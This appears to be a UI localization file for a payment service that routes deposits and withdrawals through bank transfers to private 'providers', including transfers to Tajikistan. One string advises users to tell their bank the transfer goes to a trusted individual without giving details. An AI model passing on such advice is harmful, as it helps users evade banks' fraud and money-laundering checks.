cancelDialog.title: Cancel the transfer and return to the store
cancelDialog.text: If you cancel the transfer, you will have to create a new order first.

description.part1: Make a transfer according to the details of our provider (individual).
description.part2: As soon as the provider receives the money from you, we will immediately replenish your balance.

PayeeSearch.lookingFor: Searching for details for your replenishment

steps_new.one: Copy the phone number and go to your bank application
steps_new.two: Make the transfer using the card number

steps_transgran.tbank: Select SBP transfer|Paste the copied phone number|Enter the bank specified in the payment form|Enter the exact amount specified on the website|Press the button to complete the payment
steps_transgran.sberbank: Select transfer by phone number/to another country|Select the country - Tajikistan|Go to the "To card or account" button|Paste the copied phone number|Enter the bank specified in the payment form|Enter the exact amount specified on the website|Press the button to complete the payment

Pay.attention: Make a transfer to the bank and amount specified in the form. Otherwise, we do not guarantee the crediting.

description.part1: Enter your details for the transfer
description.part2: Once the provider confirms the transfer, you will receive your funds.

PayOut.wrongRequisites: If you enter the wrong details, you will irrevocably lose your funds
PayOut.approveTransferText: If the transfer was received, toggle the switch and press the continue button.
PayOut.dontCloseWindow: Do not close the payment window!

dontCloseSteps.one: Your account will be topped up with several payments, each of which must be confirmed
dontCloseSteps.three: Wait for the successful top-up screen

dispute.successText: You will be assigned a new operator for payment of part of the withdrawal.
dispute.failText: You will be redirected to the next payment step.

notification.title: Please be more careful during the next transfer check.
notification.text: After the second dispute closed in favor of the operator, we will be forced to restrict your access to withdrawals.

errors.expireDateError: Expiration date must be in MM/YY format
errors.expreDateRangeError: Expiration date must be in the future
errors.paymentNotFound: Payment with this id was not found

PayerData.getCard: Your card has been accepted, press pay to proceed to the payment page

PayeeData.waitConfirmation: The provider is checking your transfer
PayeeData.waitComment: As soon as the provider confirms the transfer, we will replenish your balance

GeneralError.timerText: You will be automatically redirected via:

PayError.pleaseRepeatOrSupport: Please try again or contact support
PayError.timerText: You will be automatically redirected via:

Success.instructions: The unpaid portion will be refunded to your account, or try again later.
Success.timerText: You will be automatically redirected via:

hint.part1: If you need additional data about the partner, report it to support.
hint.part2: If the bank asks about the purpose of the transfer, you can say you are making a transfer to a trusted individual without providing details.

SupportDialog.text: Copy the request identifier and send it to the support chat. The operator will check its status.
